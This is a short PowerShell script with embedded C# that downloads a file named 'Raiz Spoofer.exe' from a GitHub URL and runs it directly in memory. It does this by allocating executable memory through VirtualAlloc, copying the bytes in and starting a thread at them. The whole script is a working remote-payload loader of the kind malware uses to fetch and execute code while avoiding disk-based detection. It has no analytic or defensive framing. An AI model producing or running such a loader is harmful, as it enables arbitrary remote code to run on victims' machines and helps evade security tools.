$url = "https://raw.githubusercontent.com/tyu0720gyi/service/main/Raiz%20Spoofer.exe"


$NativeLoader = @"
using System;
using System.Runtime.InteropServices;
public class Runner {
    [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint allocType, uint prot);
    [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, out uint id);
    [DllImport("kernel32.dll")] public static extern uint WaitForSingleObject(IntPtr handle, uint ms);
    public static void Start(byte[] data) {
        IntPtr p = VirtualAlloc(IntPtr.Zero, (uint)data.Length, 0x3000, 0x40);
        Marshal.Copy(data, 0, p, data.Length);
        uint id;
        IntPtr h = CreateThread(IntPtr.Zero, 0, p, IntPtr.Zero, 0, out id);
        WaitForSingleObject(h, 0xFFFFFFFF);
    }
}
"@

try {
    Write-Host "[*] Action: Downloading C++ Binary..." -ForegroundColor Cyan
    $bin = (New-Object System.Net.WebClient).DownloadData($url)
    
    Write-Host "[*] Action: Mapping Native Memory..." -ForegroundColor Cyan
    Add-Type -TypeDefinition $NativeLoader
    

    [Runner]::Start($bin)
    
    Write-Host "[+] Result: Executed Successfully!" -ForegroundColor Green
} catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
}
